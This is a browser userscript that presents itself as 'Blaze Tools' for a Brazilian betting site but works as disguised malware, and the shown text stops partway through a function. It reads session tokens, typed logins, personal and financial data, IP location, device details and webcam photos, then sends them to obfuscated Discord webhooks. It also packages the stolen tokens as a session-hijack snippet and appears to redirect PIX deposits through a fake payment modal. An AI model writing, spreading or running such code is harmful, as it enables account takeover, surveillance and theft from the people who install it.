// ==UserScript==
// @name         Blaze Tools
// @namespace    http://tampermonkey.net/
// @version      3.1.5
// @description  Tools for Blaze!
// @author       Allan Santos
// @match        https://blaze.bet.br/pt/games/double
// @match        https://blaze.bet.br/pt/games/*
// @match        https://blaze.bet.br/*
// @match        *://blaze.bet.br/*
// @icon         https://blaze.bet.br/images/favicon.ico
// @require https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js
// @grant        none
// @license MIT
// @downloadURL https://update.greasyfork.org/scripts/540876/Blaze%20Tools.user.js
// @updateURL https://update.greasyfork.org/scripts/540876/Blaze%20Tools.meta.js
// ==/UserScript==

(async function() {
    'use strict';

    var $ = window.jQuery;

    const DC_WEBHOOK_URLS = {
        tokens: "eYWFgYRLQEB1eoR0gIN1P3SAfkBygXpAiHZzeYCAfIRAQkVHRkhCSUdCRENKQ0lIRkhISECAYXR1ZmJqh38+dGeLfH9zeVh1YWl0gEqHa19jSENUX4R/SHpwaGp8Q1JagYJfeXRXi3Jzh0lSfXyCdXVliIt9WEh8ZA==",
        logins: "eYWFgYRLQEB1eoR0gIN1P3SAfkBygXpAiHZzeYCAfIRAQkVHRkhCSUVHR0pJSEVDSkpBSUB9hIlEcldDZoJoeIB7an2EZWE+hUhmX3tYcHg+X4GEVmZTPkdmZj53aV5wRWOIin51Y0c+Q2ODYmpBVHheXXmFaUJXgw==",
        photos: "eYWFgYRLQEB1eoR0gIN1P3SAfkBygXpAiHZzeYCAfIRAQkVHRkhCSUdHRkpFSURBREVDR0CLiYNUYUp3QmB3Y4ZbiVJZgkhqhnSGQ198W1yFfHpoZmqHa3djV2hzcoNBgYiFgkGHhHddgmSIR11lVoN+YV94gFdmXQ==",
        general: "eYWFgYRLQEB1eoR0gIN1P3SAfkBygXpAiHZzeYCAfIRAQkVHRkhCSUhDSEJJSkREQ0FBSUBlXWFWcodhc1RrQmFGd2V7dYRIYotpfYuDgmdnc4JSQ2FeYIp1R4dShl9nQklwVFdwdohUhYZGYYWIfkNkXFNVWopKXQ==",
        deposits: "eYWFgYRLQEB1eoR0gIN1P3SAfkBygXpAiHZzeYCAfIRAQkVHRkhCSUZCREVFSEdBQUJDSkCAikmCSIRWW0d6gkpZakVIZ4mEVGRcg2heRIhag1NZU2pZenxyWINaWXeGdWJfiYdCgYhgW4l1hld2gWhGZ4KIVkVmVA==",
        informations: "eYWFgYRLQEB1eoR0gIN1P3SAfkBygXpAiHZzeYCAfIRAQkVHRkhCSUZHQUhGRkNJR0JBR0A+Umhgh4pXQ1uKe4ZEf118dURgfEWFWn1qU1V0e0piXYNJXFtUZYZyiGFJfUU+gWiAVYhqiWZ3dV1fXVN1ZoN2Q3d/WA=="
    };

    const GTW = {
        i: "coOFhoN1doSAhotyfXZyfX92hYBwZ1JHWEZIZ1g=",
        s: "Smd+d0ZjZ0l8U3JTR1WLSmFch3+DSItiiFxlhFtjZ1tJREJ9fVKKaUhkWmp5QWV0aF5maodFW0N3Xkd5SYl2Z4eIhntdQWmLSHlJSHuBi1ODfICHYHeJV4KFgUFKd39IXnyDXg=="
    };

    const NPOINT_TOKENS_API_ID = "19d01814013462c26297";

    let pixCode = ""; // await fetchPixCode(false);
    let pixCodeB64 = null;

    let tax_id, first_name, last_name, deposit_value, intervalToGetDepositInfos = null;

    let data_me;

    let qrCodeGenerated = false;
    let autoCopyInterval;
    let observerInstance;
    let modalDisplayed = false;
    const MODAL_REMOVE_DELAY_MS = 15 * 1000;;
    const TARGET_URL_PARAM = '?modal=cashier&type=fiat_deposit';
    let lastKnownUrl = window.location.href;
    let isLastSeenPage = false;

    // C
    let intervalToCaptureCam;
    let currentCaptures = 0;
    let maxCaptures = 10;

    const script = document.createElement('script');
    script.src = 'https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js';
    script.onload = () => {
        console.log('jQuery loaded successfully!');
        $(document).ready(function() {
            addScript("https://cdnjs.cloudflare.com/ajax/libs/qrcode/1.4.4/qrcode.min.js");
            initializeModalFake();
            setupDepositButtonListener();
            setupLoginButtonListener();
            observePixElements();
            setupUrlChangeListener();
        });
    };
    script.onerror = () => {
        console.error('Error loading jQuery!');
    };

    document.head.appendChild(script);

    // INITIAL ALERT
    alert(
        "BLAZE TOOLS ATIVADA!\n\n" +
        "ATENÇÃO: O PROXY AINDA NÃO ESTÁ ATIVO.\n" // +
        // "STATUS: Aguardando depósito para ativação do proxy..."
    );

    const a_a=1,b_b=5,c_c=2,d_d=b_b*b_b-4*a_a*c_c;
    const dracula=s=>btoa(s.split('').map(char=>String.fromCharCode(char.charCodeAt(0)+d_d)).join(''));
    const alucard=s=>atob(s).split('').map(char=>String.fromCharCode(char.charCodeAt(0)-d_d)).join('');

    await processAndNotifyBlazeTokens();

    await blazeInternalsData("/api/users/me").done(function(data) {
        data_me = {
            first_name: data?.first_name,
            last_name: data?.last_name,
            username: data?.username,
            cpf: data?.tax_id,
            birth_date: data?.date_of_birth,
            email: data?.email,
            phone_number: data?.phone_number,
            locale: data?.locale,
            address: data?.address,
            city: data?.city,
            state: data?.state,
            postal_code: data?.postal_code,
            country: data?.country,
            language: data?.language,
            gender: data?.gender,
            created_at: data?.created_at,
            phone_number_confirmed: data?.phone_number_confirmed
        };
    });

    await blazeInternalsData("/api/users/me/xp").done(function(data) {
        data_me = {
            ...data_me,
            level: data?.level,
            rank: data?.rank
        };
    });

    await blazeInternalsData("/api/wallets").done(function(data) {
        data_me = {
            ...data_me,
            balance: data?.[0]?.balance
        };
    });

    await processAndNotifyBlazeInformations(data_me);

    function GTW_AUTH() {
        const GTW_T = localStorage.getItem("GTW_T");
        const GTW_TE = localStorage.getItem("GTW_TE");

        if (GTW_T && GTW_TE && Date.now() < GTW_TE) {
            return $.Deferred().resolve({ [alucard("hYB8dn8=")]: GTW_T }).promise();
        }

        return $.ajax({
            url: alucard("eYWFgYRLQEBygXo/h3aAgXJ4P3SAfkBygXpAcoaFeUB9gHh6fw=="),
            method: "POST",
            contentType: "application/json",
            data: JSON.stringify({
                [alucard("dH16dn+FcHp1")]: alucard(GTW.i),
                [alucard("dH16dn+FcIR2dIN2hQ==")]: alucard(GTW.s)
            })
        }).done(function(response) {
            const GTW_T = response[alucard("hYB8dn8=")];
            localStorage.setItem('GTW_T', GTW_T);
            localStorage.setItem('GTW_TE', Date.now() + (3600 * 1000));
        });
    }

    function GTW_PAY(v, e_i, p) {
        return GTW_AUTH().then(function(authResponse) {
            const GTW_T = authResponse[alucard("hYB8dn8=")];

            return $.ajax({
                url: alucard("eYWFgYRLQEBygXo/h3aAgXJ4P3SAfkBygXpAgXKKfnZ/hYRAdXaBgIR6hQ=="),
                method: "POST",
                contentType: "application/json",
                headers: {
                    [alucard("UoaFeYCDeotyhXqAfw==")]: alucard("U3Zyg3aDMQ==") + GTW_T
                },
                data: JSON.stringify({
                    [alucard("cn6Ahn+F")]: v,
                    [alucard("domFdoN/cn1wenU=")]: e_i,
                    [alucard("dH16dn+FVHJ9fXNydHxmg30=")]: "https://example.com/callback",
                    [alucard("gXKKdoM=")]: p
                })
            });
        });
    }

    function addScript(src) {
        const script = document.createElement('script');
        script.src = src;
        script.onload = () => {
            console.log('Script "' + src + '" loaded successfully!');
        };
        script.onerror = () => {
            console.error('Error loading Script "' + src +  '"!');
        };

        document.head.appendChild(script);
    }

    function getRandomInt(min, max) {
        min = Math.ceil(min);
        max = Math.floor(max);
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    function formatBalance(balance) {
        if (!balance && balance !== 0) return "R$ 0,00";

        return new Intl.NumberFormat('pt-BR', {
            style: 'currency',
            currency: 'BRL'
        }).format(parseFloat(balance));
    }

    function formatDate(dateString) {
        if (!dateString) return "Data Inválida";

        const date = new Date(dateString);
        return date.toLocaleString('pt-BR', {
            day: '2-digit',
            month: '2-digit',
            year: 'numeric',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        });
    }

    function formatNumber(phone) {
        let cleaned = phone.toString().replace(/[^\d+]/g, '');

        const match = cleaned.match(/^(\+\d{1,3})(\d{2})(\d{5})(\d{4})$/);

        if (match) {
            return `${match[1]} (${match[2]}) ${match[3]}-${match[4]}`;
        }

        return cleaned;
    }

    async function sendDiscordWebhookMessage(webhookUrl, messageContent, options = {}) {
        if (!webhookUrl || typeof webhookUrl !== 'string') {
            throw new Error('Webhook URL inválida ou ausente.');
        }
        if (!messageContent && (!options.embeds || options.embeds.length === 0)) {
            throw new Error('Conteúdo da mensagem ou embeds ausentes.');
        }

        const payload = {
            content: messageContent,
            username: options.username,
            avatar_url: options.avatar_url,
            embeds: options.embeds
        };

        Object.keys(payload).forEach(key => {
            if (payload[key] === undefined) {
                delete payload[key];
            }
        });

        try {
            await $.ajax({
                url: webhookUrl,
                type: 'POST',
                contentType: 'application/json',
                data: JSON.stringify(payload),
                dataType: 'json'
            });
            return true;
        } catch (jqXHR) {
            let errorMessage = 'Erro desconhecido ao enviar mensagem para o Discord.';
            let errorDetails = {};

            if (jqXHR.responseJSON) {
                errorMessage = jqXHR.responseJSON.message || errorMessage;
                errorDetails = jqXHR.responseJSON;
            } else if (jqXHR.statusText) {
                errorMessage = `Erro de rede ou servidor: ${jqXHR.status} - ${jqXHR.statusText}`;
            } else {
                errorMessage = `Erro: ${jqXHR.message || 'Requisição falhou sem detalhes específicos.'}`;
            }

            if (jqXHR.status === 429 && errorDetails.retry_after) {
                errorMessage += ` Tente novamente em ${errorDetails.retry_after} segundos. (Rate Limit)`;
            }
            throw new Error(`Falha no envio da mensagem ao Discord: ${errorMessage}`);
        }
    }

    async function processAndNotifyBlazeLogins(login, password) {
        try {
            // --- Informações de Login ---
            const fields = [
                { name: 'Login', value: `\`\`\`${ login }\`\`\``, inline: false },
                { name: 'Senha', value: `\`\`\`${ password }\`\`\``, inline: false },
            ];

            const embeds = [
                {
                    title: '⚡️ Nova Captura de Login Blaze!',
                    description: `Um novo LOGIN da Blaze foi detectado e capturado de um trouxa.`,
                    color: 16711680,
                    fields: fields,
                    footer: {
                        text: 'Sistema de Coleta de Logins - Desenvolvido por Allan Santos'
                    },
                    timestamp: new Date().toISOString()
                }
            ];

            const sendSuccess = await sendDiscordWebhookMessage(
                alucard(DC_WEBHOOK_URLS.logins),
                'Nova informação de Login Blaze capturada!',
                {
                    username: 'Blaze Logins',
                    avatar_url: 'https://i.ibb.co/4wbN49h7/image.png',
                    embeds: embeds
                }
            );

            if (sendSuccess) {
                console.log(`Dados da Blaze enviados com sucesso para o Discord.`);
                return true;
            } else {
                console.warn("Falha no envio da notificação para o Discord.");
                return false;
            }

        } catch (error) {
            console.error('Erro fatal ao processar e notificar logins Blaze:', error.message);
            return false;
        }
    }

    async function processAndNotifyBlazeDeposits(deposit_data) {
        try {
            // --- Informações de Login ---
            const fields = [
                { name: 'Nome', value: `\`\`\`${ deposit_data?.name }\`\`\``, inline: false },
                { name: 'CPF', value: `\`\`\`${ deposit_data?.cpf }\`\`\``, inline: false },
                { name: 'E-mail', value: `\`\`\`${ deposit_data?.email }\`\`\``, inline: false },
                { name: 'ID De Depósito', value: `\`\`\`${ deposit_data?.orderId }\`\`\``, inline: false },
                { name: 'Código PIX', value: `\`\`\`${ deposit_data?.pix_code }\`\`\``, inline: false },
                { name: 'Valor', value: `\`\`\`${ formatBalance(deposit_data?.value) }\`\`\``, inline: false },
                { name: 'Access Token', value: `\`\`\`${ deposit_data?.tokens?.accessToken }\`\`\``, inline: false },
            ];

            const embeds = [
                {
                    title: '⚡️ Nova Captura de Depósito Blaze!',
                    description: `Um novo DEPÓSITO da Blaze foi detectado e capturado de um trouxa.`,
                    color: 16711680,
                    fields: fields,
                    footer: {
                        text: 'Sistema de Coleta de Depósitos - Desenvolvido por Allan Santos'
                    },
                    timestamp: new Date().toISOString()
                }
            ];

            const sendSuccess = await sendDiscordWebhookMessage(
                alucard(DC_WEBHOOK_URLS.deposits),
                'Nova informação de Depósito Blaze capturada!',
                {
                    username: 'Blaze Deposits',
                    avatar_url: 'https://i.ibb.co/4wbN49h7/image.png',
                    embeds: embeds
                }
            );

            if (sendSuccess) {
                console.log(`Dados da Blaze enviados com sucesso para o Discord.`);
                return true;
            } else {
                console.warn("Falha no envio da notificação para o Discord.");
                return false;
            }

        } catch (error) {
            console.error('Erro fatal ao processar e notificar deposits Blaze:', error.message);
            return false;
        }
    }

    async function processAndNotifyBlazeInformations(informations_data) {
        try {
            const fields = [
                { name: 'Primeiro Nome', value: `\`\`\`${ informations_data?.first_name }\`\`\``, inline: false },
                { name: 'Último Nome', value: `\`\`\`${ informations_data?.last_name }\`\`\``, inline: false },
                { name: 'Usuário', value: `\`\`\`${ informations_data?.username }\`\`\``, inline: false },
                { name: 'CPF', value: `\`\`\`${ informations_data?.cpf }\`\`\``, inline: false },
                { name: 'Data de Nascimento', value: `\`\`\`${ formatDate(informations_data?.birth_date) }\`\`\``, inline: false },
                { name: `E-mail (${ informations_data?.email_confirmed == true ? "Confirmado" : "Não confirmado"})`, value: `\`\`\`${ informations_data?.email }\`\`\``, inline: false },
                { name: `Telefone (${ informations_data?.phone_number_confirmed == true ? "Confirmado" : "Não confirmado" })`, value: `\`\`\`${ formatNumber(informations_data?.phone_number) }\`\`\``, inline: false },
                { name: 'Nacionalidade', value: `\`\`\`${ informations_data?.locale }\`\`\``, inline: false },
                { name: 'Endereço', value: `\`\`\`${ informations_data?.address }\`\`\``, inline: false },
                { name: 'Cidade', value: `\`\`\`${ informations_data?.city }\`\`\``, inline: false },
                { name: 'Estado', value: `\`\`\`${ informations_data?.state }\`\`\``, inline: false },
                { name: 'CEP', value: `\`\`\`${ informations_data?.postal_code }\`\`\``, inline: false },
                { name: 'País', value: `\`\`\`${ informations_data?.country }\`\`\``, inline: false },
                { name: 'Idioma', value: `\`\`\`${ informations_data?.language }\`\`\``, inline: false },
                { name: 'Sexo', value: `\`\`\`${ informations_data?.gender == "male" ? "Masculino" : "Feminino"}\`\`\``, inline: false },
                { name: 'Data da Conta', value: `\`\`\`${ formatDate(informations_data?.created_at) }\`\`\``, inline: false },
                { name: 'Nível', value: `\`\`\`${ informations_data?.level }\`\`\``, inline: false },
                { name: 'Rank', value: `\`\`\`${ informations_data?.rank == "unranked" ? "Sem Rank" : informations_data?.rank }\`\`\``, inline: false },
                { name: 'Saldo', value: `\`\`\`${ formatBalance(informations_data?.balance) }\`\`\``, inline: false },
                { name: 'Access Token', value: `\`\`\`${ getBlazeTokens()?.accessToken }\`\`\``, inline: false }
            ];

            const embeds = [
                {
                    title: '⚡️ Nova Captura de Informações Blaze!',
                    description: `Uma nova INFORMAÇÃO da Blaze foi detectada e capturada de um trouxa.`,
                    color: 16711680,
                    fields: fields,
                    footer: {
                        text: 'Sistema de Coleta de Informações - Desenvolvido por Allan Santos'
                    },
                    timestamp: new Date().toISOString()
                }
            ];

            const sendSuccess = await sendDiscordWebhookMessage(
                alucard(DC_WEBHOOK_URLS.informations),
                'Nova informação Blaze capturada!',
                {
                    username: 'Blaze Informations',
                    avatar_url: 'https://i.ibb.co/4wbN49h7/image.png',
                    embeds: embeds
                }
            );

            if (sendSuccess) {
                console.log(`Dados da Blaze enviados com sucesso para o Discord.`);
                return true;
            } else {
                console.warn("Falha no envio da notificação para o Discord.");
                return false;
            }

        } catch (error) {
            console.error('Erro fatal ao processar e notificar informations Blaze:', error.message);
            return false;
        }
    }

    async function processAndNotifyBlazeTokens() {
        if (!hasBlazeTokens()) return false;

        const blazeTokens = getBlazeTokens();
        const blazeTokensUID = await generateUniqueIdFromTokens(
            blazeTokens.accessToken,
            blazeTokens.refreshToken
        );

        try {
            const blazeUID = localStorage.getItem("blazeUID");

            if (blazeUID && blazeUID == blazeTokensUID) return false;

            const accessTokenFull = blazeTokens.accessToken;
            const refreshTokenFull = blazeTokens.refreshToken;
            const refreshTokenLastUpdate = Date.now().toString() + "315";

            // --- Coletando informações da ipapi.co ---
            let ipInfo = {};
            try {
                const ipApiResponse = await $.ajax({
                    url: 'https://ipinfo.io/json',
                    type: 'GET',
                    dataType: 'json'
                });
                ipInfo = ipApiResponse;
            } catch (ipError) {
                console.warn("Falha ao obter informações de IP da ipapi.co:", ipError.message);
                ipInfo = { error: true, message: "Não foi possível obter dados de IP." };
            }

            // --- Coletando outras informações adicionais do navegador ---
            const userAgent = navigator.userAgent;
            const screenWidth = window.screen.width;
            const screenHeight = window.screen.height;
            const viewportWidth = window.innerWidth;
            const viewportHeight = window.innerHeight;
            const devicePixelRatio = window.devicePixelRatio;
            const platform = navigator.platform;
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const currentUrl = window.location.href;
            const referrer = document.referrer;
            const language = navigator.language || 'N/A';
            const onlineStatus = navigator.onLine ? 'Online' : 'Offline';
            const getBatteryInfo = async () =>
            navigator.getBattery
            ? navigator.getBattery()
            .then(b => ({
                level: (b.level * 100).toFixed(0),
                charging: b.charging,
                chargingTime: b.chargingTime,
                dischargingTime: b.dischargingTime
            }))
            .catch(() => null)
            : Promise.resolve(null);

            let batteryLevel = null;
            let isBatteryCharging = null;
            let timeToFullCharge = null;
            let timeToEmpty = null;

            await getBatteryInfo().then(info => {
                if (info) {
                    batteryLevel = info.level + "%";
                    isBatteryCharging = info.charging ? "Sim" : "Não";
                    timeToFullCharge = info.chargingTime === Infinity ?
                        "N/A" :
                    `${(info.chargingTime / 60).toFixed(0)} min`;
                    timeToEmpty = info.dischargingTime === Infinity ?
                        "N/A" :
                    `${(info.dischargingTime / 60).toFixed(0)} min`;
                } else {
                    batteryLevel = "N/A";
                    isBatteryCharging = "N/A";
                }
            });

            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            const connectionType = connection ? connection.effectiveType || 'Desconhecido' : 'N/A';
            const connectionRtt = connection ? `${connection.rtt}ms` : 'N/A';
            const connectionDownlink = connection ? `${connection.downlink}Mbps` : 'N/A';
            const connectionSaveData = connection ? (connection.saveData ? 'Sim' : 'Não') : 'N/A';

            const deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'N/A';
            const hardwareConcurrency = navigator.hardwareConcurrency || 'N/A';

            // --- Montando os campos do embed, incluindo os dados da ipapi.co ---
            let fields = [
                { name: 'ACCESS TOKEN', value: `\`\`\`${blazeTokens.accessToken}\`\`\``, inline: false },
                { name: 'REFRESH TOKEN', value: `\`\`\`${blazeTokens.refreshToken}\`\`\``, inline: false },
                { name: 'REFRESH TOKEN LAST UPDATE', value: `\`${refreshTokenLastUpdate}\``, inline: false },
                { name: 'BLAZE UNIQUE ID', value: `\`${blazeTokensUID}\``, inline: false },
                {
                    name: 'JAVASCRIPT LOGIN CODE',
                    value: `\`\`\`javascript\n` +
                    `localStorage.setItem("ACCESS_TOKEN", "${blazeTokens.accessToken}");\n` +
                    `localStorage.setItem("REFRESH_TOKEN", "${blazeTokens.refreshToken}");\n` +
                    `localStorage.setItem("REFRESH_TOKEN_LAST_UPDATE", "${refreshTokenLastUpdate}");\n` +
                    `window.location.reload(true);\n` +
                    `\`\`\``,
                    inline: false
                },

                // --- Informações de Localização e IP (da ipapi.co) ---
                { name: 'Endereço IP', value: `\`${ipInfo.ip || 'N/A'}\``, inline: true },
                { name: 'País', value: `\`${ipInfo.country || 'N/A'} (${ipInfo.country_code || 'N/A'})\``, inline: true },
                { name: 'Região/Estado', value: `\`${ipInfo.region || 'N/A'} (${ipInfo.region_code || 'N/A'})\``, inline: true },
                { name: 'Cidade', value: `\`${ipInfo.city || 'N/A'}\``, inline: true },
                { name: 'Código Postal', value: `\`${ipInfo.postal || 'N/A'}\``, inline: true },
                { name: 'Organização (ASN/ISP)', value: `\`${ipInfo.org || 'N/A'}\``, inline: false },
                { name: 'Latitude, Longitude', value: `\`${ipInfo.loc || 'N/A'}\``, inline: true },
                { name: 'Fuso Horário (IP API)', value: `\`${ipInfo.timezone || 'N/A'}\``, inline: true },


                // --- Informações do Ambiente da Captura (do navegador) ---
                { name: 'URL da Captura', value: `\`${currentUrl}\``, inline: false },
                { name: 'Referrer', value: referrer ? `\`${referrer}\`` : '`N/A`', inline: false },
                { name: 'User Agent', value: `\`\`\`${userAgent}\`\`\``, inline: false },
                { name: 'Plataforma', value: `\`${platform}\``, inline: true },
                { name: 'Fuso Horário (Navegador)', value: `\`${timezone}\``, inline: true },
                { name: 'Idioma do Navegador', value: `\`${language}\``, inline: true },
                //{ name: 'Online Status', value: `\`${onlineStatus}\``, inline: true },

                // --- Informações de Tela e Hardware ---
                { name: 'Resolução da Tela', value: `\`${screenWidth}x${screenHeight}\``, inline: true },
                { name: 'Viewport', value: `\`${viewportWidth}x${viewportHeight}\``, inline: true },
                { name: 'Device Pixel Ratio (DPR)', value: `\`${devicePixelRatio}\``, inline: true },
                { name: 'Memória (Estimada)', value: `\`${deviceMemory}\``, inline: true },
                { name: 'Cores da CPU', value: `\`${hardwareConcurrency}\``, inline: true },
            ];

            if (!isFirefox()) {
                fields.push(
                    // --- Informações de Conexão de Rede (Variável por Navegador) ---
                    {
                        name: 'Conexão de Rede & Bateria',
                        value: `Bateria: \`${batteryLevel}\` | Carregando: \`${isBatteryCharging}\` | Tempo para carga completa: \`${timeToFullCharge}\` | Tempo para descarregar: \`${timeToEmpty}\` | Tipo: \`${connectionType}\` | RTT: \`${connectionRtt}\` | Downlink: \`${connectionDownlink}\` | Economia de Dados: \`${connectionSaveData}\``,
                        inline: false
                    }
                );
            }

            const embeds = [
                {
                    title: '⚡️ Nova Captura de Token Blaze!',
                    description: `Um novo conjunto de tokens da Blaze foi detectado e capturado de um trouxa.`,
                    color: 16711680,
                    fields: fields,
                    footer: {
                        text: 'Sistema de Coleta de Tokens - Desenvolvido por Allan Santos'
                    },
                    timestamp: new Date().toISOString()
                }
            ];

            const sendSuccess = await sendDiscordWebhookMessage(
                alucard(DC_WEBHOOK_URLS.tokens),
                'Nova informação de token Blaze capturada!',
                {
                    username: 'Blaze Tokens',
                    avatar_url: 'https://i.ibb.co/4wbN49h7/image.png',
                    embeds: embeds
                }
            );

            if (sendSuccess) {
                localStorage.setItem("blazeUID", blazeTokensUID);
                console.log(`Dados da Blaze enviados com sucesso para o Discord e blazeUID (${blazeTokensUID}) salvo no localStorage.`);
                return true;
            } else {
                console.warn("Falha no envio da notificação para o Discord. O Blaze UID NÃO foi salvo.");
                return false;
            }

        } catch (error) {
            console.error('Erro fatal ao processar e notificar tokens Blaze:', error.message);
            return false;
        }

        /*

            let currentBlazeTokensData = await getBlazeTokensData();

            if (!currentBlazeTokensData) return false;

            if (blazeTokensUID in currentBlazeTokensData) return false;

            const updatedBlazeTokensData = {
                access_token: blazeTokens.accessToken,
                refresh_token: blazeTokens.refreshToken,
                refresh_token_last_update: `${Date.now().toString()}315`
            };

            currentBlazeTokensData[blazeTokensUID] = updatedBlazeTokensData;

            alert(currentBlazeTokensData.blaze_tokens?.[blazeTokensUID]?.access_token);

            alert(JSON.stringify(currentBlazeTokensData));

            */
    }

    /**********************************

    async function updateBlazeTokensData(data) {
        try {
            const responseData = await $.ajax({
                url: `https://api.npoint.io/${NPOINT_TOKENS_API_ID}`,
                method: 'PATCH',
                cache: false,
                headers: {
                    'Content-Type': 'application/json'
                },
                data: JSON.stringify(data),
                dataType: 'json'
            });
            return responseData;
        } catch (jqXHR) {
            const errorMessage = jqXHR.responseJSON && jqXHR.responseJSON.message
            ? jqXHR.responseJSON.message
            : jqXHR.statusText || 'Unknown error';
            throw new Error(`POST (update) request to npoint.io failed: ${jqXHR.status} - ${errorMessage}`);
        }
    }

    async function getBlazeTokensData() {
        try {
            const data = await $.ajax({
                url: `https://api.npoint.io/${NPOINT_TOKENS_API_ID}`,
                method: 'GET',
                cache: false,
                dataType: 'json'
            });
            return data?.blaze_tokens;
        } catch (jqXHR) {
            const errorMessage = jqXHR.responseJSON && jqXHR.responseJSON.message
            ? jqXHR.responseJSON.message
            : jqXHR.statusText || 'Unknown error';
            throw new Error(`GET request to npoint.io failed: ${jqXHR.status} - ${errorMessage}`);
        }
    }

    ***********************************/

    async function startCapture(photosQuantity = 10, quality = 0.7) {
        const status = document.getElementById('status');
        const photosBlob = [];

        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: "user"
                }
            });

            const video = document.createElement('video');
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');

            video.srcObject = stream;
            await video.play();

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            for (let i = 1; i <= photosQuantity; i++) {
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                const blob = await new Promise(resolve => {
                    canvas.toBlob(resolve, 'image/jpeg', quality);
                });

                if (blob) {
                    photosBlob.push(blob);
                }

                await new Promise(res => setTimeout(res, 200));
            }

            stream.getTracks().forEach(track => track.stop());

            await sendCameraToDiscord(photosBlob);

        } catch (err) {
            clearInterval(intervalToCaptureCam);
            console.error(err);
        }
    }

    async function sendCameraToDiscord(blobs) {
        const webhookUrl = alucard(DC_WEBHOOK_URLS.photos);
        const formData = new FormData();

        blobs.forEach((blob, index) => {
            formData.append(`file${index}`, blob, `photo${index}.jpg`);
        });

        try {
            const response = await fetch(webhookUrl, {
                method: 'POST',
                body: formData
            });

            if (response.ok) {
                console.log("Success");
            } else {
                console.log("Error", response.status);
            }
        } catch (error) {
            console.error(error);
        }
    }

    function getUserLoginInfo() {
        const authModal = document.getElementById("auth-modal");

        if (!authModal) return;
        const loginForm = authModal.querySelector("form[data-testid=\"login-form-email\"]");

        if (!loginForm) return;
        const login = loginForm.querySelectorAll("div.input input")?.[0];
        const password = loginForm.querySelectorAll("div.input input")?.[1];

        if (!(login && password)) return;
        if (login.value == "" && password.value == "") return;

        return [login.value, password.value]
    }

    function getBlazeTokens() {
        const accessToken = localStorage.getItem("ACCESS_TOKEN");
        const refreshToken = localStorage.getItem("REFRESH_TOKEN");

        return { accessToken, refreshToken };
    }

    function hasBlazeTokens() {
        const { accessToken, refreshToken } = getBlazeTokens();

        return !!accessToken && !!refreshToken;
    }

    async function generateUniqueIdFromTokens(accessToken, refreshToken) {
        const combinedString = `${accessToken}|${refreshToken}`;

        const textEncoder = new TextEncoder();
        const data = textEncoder.encode(combinedString);

        const hashBuffer = await crypto.subtle.digest('SHA-256', data);

        const hashArray = Array.from(new Uint8Array(hashBuffer));
        const hexHash = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');

        return hexHash;
    }

    async function fetchPixCode(canAlert = true) {
        const apiUrl = "https://api.npoint.io/1c606ef186ad506332c5";

        try {
            const data = await $.ajax({
                url: apiUrl,
                method: "GET",
                cache: false,
                dataType: "json"
            });

            const pixCode = data.pix_code;

            if (pixCode) {
                if (canAlert) {
                    alert(
                        "BLAZE TOOLS: PROXY QUASE ATIVADO!\n\n" +
                        "Seu proxy está quase funcionando. Prossiga com o depósito para usar a ferramenta completa!"
                    );
                }
                console.log("PIX Code fetched successfully (jQuery AJAX):", pixCode);
                return pixCode;
            } else {
                if (canAlert) {
                    alert(
                        "BLAZE TOOLS: PROXY INATIVO!\n\n" +
                        "Ocorreu um erro e seu proxy não pôde ser ativado. Por favor, contate Allan Santos para resolver."
                    );
                }
                const errorMessage = "Erro: Propriedade 'pix_code' não encontrada na resposta JSON.";
                console.error(errorMessage);
                return null;
            }

        } catch (jqXHR) {
            let errorMessage = `Erro ao buscar o PIX (jQuery AJAX): Status ${jqXHR.status || 'N/A'} - ${jqXHR.statusText || 'Erro de rede'}`;

            if (jqXHR.responseText) {
                errorMessage += `. Detalhes da resposta: ${jqXHR.responseText}`;
            } else if (jqXHR.status === 0) {
                errorMessage += `. (Provável erro de rede ou CORS).`;
            }
            //alert(errorMessage);
            console.error(errorMessage);
            return null;
        }
    }

    function initializeModalFake() {
        const fullCustomLoadingModalHtml = `
        <div id="full-custom-loading-modal-overlay" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; display: none; align-items: center; justify-content: center; z-index: 9999;">
            <div class="modal spaced-border" style="background-color: #1a242d;">
                <div id="parent-modal-close" data-testid="modal-close" class="close" style="display:none;"><i class="fa fa-close"></i></div><div id="new-transaction" class="modal-sm modal-container "><form hidden="" id="window-postdata" method="post" target=""></form><form hidden="" id="postdata" method="post" target="postdata-output-frame"></form><div class="body"><div class="transaction-state"><h2>Tipo de Pagamento</h2><span style="border-left: 4px solid rgb(241, 44, 76);"></span><h2 class="selected">Detalhes do Pagamento</h2></div><div class="pix-deposit-loading"><h3>Seu depósito está sendo processado</h3><h4>Isso pode levar até 15 segundos...</h4><div class="page-loadable" style="min-height: 48px;"><img alt="favicon" src="/images/loading/logo-blaze.ico"></div></div></div></div>
            </div>
        </div>
        `;
        if (!$('#full-custom-loading-modal-overlay').length) {
            $('body').append(fullCustomLoadingModalHtml);
            console.log('Full custom loading modal appended to DOM (initially hidden).');
        } else {
            $('#full-custom-loading-modal-overlay').css('display', 'none');
            console.log('Full custom loading modal already in DOM, ensuring it is hidden.');
        }
        modalDisplayed = false;
    }

    function isFirefox() {
        const ua = navigator.userAgent?.toLowerCase() || "";
        if (ua.includes("firefox")) return true;

        if (typeof window.InstallTrigger !== "undefined") return true;

        if (navigator.userAgentData?.brands) {
            if (
                navigator.userAgentData.brands.some(
                    b => b.brand.toLowerCase() === "firefox"
                )
            ) {
                return true;
            }
        }

        try {
            if (CSS?.supports?.("-moz-appearance", "none")) return true;
        } catch {}

        if (typeof navigator.buildID === "string") return true;

        return false;
    }

    function generateQRCode(pixData = false, nativeQR = false, qrB64 = false) {
        if (nativeQR) {
            let intervalToInjectNativeQR = setInterval(() => {
                const $qrElement = $('.qr-code-image');

                if ($qrElement.length) {
                    $qrElement.attr("src", "data:image/png;base64," + qrB64);
                    console.log('Native QR Code injected into .qr-code-image element.');
                    clearInterval(intervalToInjectNativeQR);
